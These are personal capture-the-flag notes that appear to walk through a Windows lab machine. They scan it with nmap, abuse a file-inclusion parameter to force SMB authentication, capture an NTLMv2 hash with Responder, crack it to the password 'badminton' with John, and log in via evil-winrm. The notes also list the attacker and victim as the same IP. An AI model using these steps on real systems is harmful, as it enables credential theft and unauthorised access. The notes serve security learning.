----
### Initial Details

Victim Machine= 10.129.242.75
Attacker = 10.129.242.75

----
## Initial Scan

- The Nmap scan showed that there is a webserver that is accessable on port 80 that is using Apache 2.4.52
```shell
nmap -sV 10.129.242.75

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.52 ((Win64) OpenSSL/1.1.1m PHP/8.1.1)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.22 seconds

Nmap done: 1 IP address (1 host up) scanned in 0.33 seconds

```
- Decided to run a full scan just in case there are any interesting ports this just turn up the  and found there there is a http service running on port 5985
```shell
nmap -p- -sV 10.129.242.75

PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.52 ((Win64) OpenSSL/1.1.1m PHP/8.1.1)
5985/tcp open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

```
- This service appears to be Windows IIS server running on Windows server, doing an nmap os makes theory correct
```shell
nmap -O 10.129.242.75 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-23 16:37 EDT
Nmap scan report for 10.129.242.75
Host is up (0.069s latency).
Not shown: 999 filtered tcp ports (no-response)
PORT   STATE SERVICE
80/tcp open  http
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows XP|2008|7 (89%)
OS CPE: cpe:/o:microsoft:windows_xp::sp3 cpe:/o:microsoft:windows_server_2008::sp1 cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_7
Aggressive OS guesses: Microsoft Windows XP SP3 (89%), Microsoft Windows Server 2008 SP1 or Windows Server 2008 R2 (85%), Microsoft Windows 7 (85%)
No exact OS matches for host (test conditions non-ideal).

OS detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.00 seconds


```

-  visiting the ip address redirects to the http://unika.htb/ domain
![[Pasted image 20230323204004.png]]
- As there is no home page, i decided to use gobuster on the domain to find hidden directories couldnt find anything 
- This webserver is employing name-based Virtual Hosting for serving the requests. Name-Based Virtual hosting is a method for hosting multiple domain names (with separate handling of each name) on a single server. This allows one server to share its resources, such as memory and processor cycles, without requiring all the services to be used by the same hostname. The web server checks the domain name provided in the Host header field of the HTTP request and sends a response according to that. The /etc/hosts file is used to resolve a hostname into an IP address & thus we will need to add an entry in the /etc/hosts file for this domain to enable the browser to resolve the address for unika.htb .
```shell
echo "10.129.242.75 unika.htb" | sudo tee -a /etc/hosts
```


%%Didnt get anywhere with looking at the the Http server so went back to look at the winrm to see if there are any exploits. found that there is a tool that can be used [Evil-WinRM](https://www.kali.org/tools/evil-winrm/) this is already installeed in%% 

- created a mini python server to listen for requests from the victim via the URL
```shell
http://unika.htb/index.php?page=//10.129.242.75/somefile

python -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...

```

We make use of responsder to capture the hash, the following cmomand with start responder on the Kali machine and once we press enter on the URL in the browser it will capture the hash 
```shell 

responder -I tun0

```

- it then finds the hash
```shell
[+] Listening for events...                                                  

[SMB] NTLMv2-SSP Client   : 10.129.242.75
[SMB] NTLMv2-SSP Username : RESPONDER\Administrator
[SMB] NTLMv2-SSP Hash     : Administrator::RESPONDER:f9a517ae35affcad:15A365972EFD174E56A6B655C687E06B:01010000000000000078F9DBBA5DD90185AAF60234A0096F0000000002000800510048003100330001001E00570049004E002D00450051004F00580057005A005800300047004E00410004003400570049004E002D00450051004F00580057005A005800300047004E0041002E0051004800310033002E004C004F00430041004C000300140051004800310033002E004C004F00430041004C000500140051004800310033002E004C004F00430041004C00070008000078F9DBBA5DD90106000400020000000800300030000000000000000100000000200000F3C39B3C120E0B031870AD32AF1AA54A85571B9397AEB166503E933F8D342CB30A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310034002E003100330036000000000000000000   
```

- We then use John The Ripper to crack the hash, had to unzip and chmod rockyou.txt because it is not set by default
```shell


john --wordlist=/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
badminton        (Administrator)     
1g 0:00:00:00 DONE (2023-03-23 19:20) 20.00g/s 81920p/s 81920c/s 81920C/s adriano..oooooo
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed. 

```

- Logged in to windows with the evil-winrm and found the user mike where the flag is located 





---

### Resources

- Microsoft HTTPAPI - https://serverfault.com/questions/52199/security-risk-microsoft-httpapi-2-0
- Convert php to base64 code : 
	- https://gupta-bless.medium.com/exploiting-local-file-inclusion-lfi-using-php-wrapper-89904478b225
	- https://book.hacktricks.xyz/pentesting-web/file-inclusion#php-filter
-